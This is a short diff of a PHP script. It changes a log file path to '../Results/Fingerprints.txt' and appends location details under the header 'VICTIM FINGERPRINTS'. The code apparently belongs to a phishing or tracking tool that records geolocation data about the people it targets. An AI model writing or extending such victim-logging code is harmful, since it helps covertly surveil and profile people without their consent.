@@ -77,7 +77,7 @@ $region   = $json['region'];
 $city     = $json['city'];
 
 // File path
-$file = 'path_to_log_file.txt';
+$file = '../Results/Fingerprints.txt';
 
 // Log details
 file_put_contents($file, print_r("\nVICTIM FINGERPRINTS => Informations \n", true), FILE_APPEND);
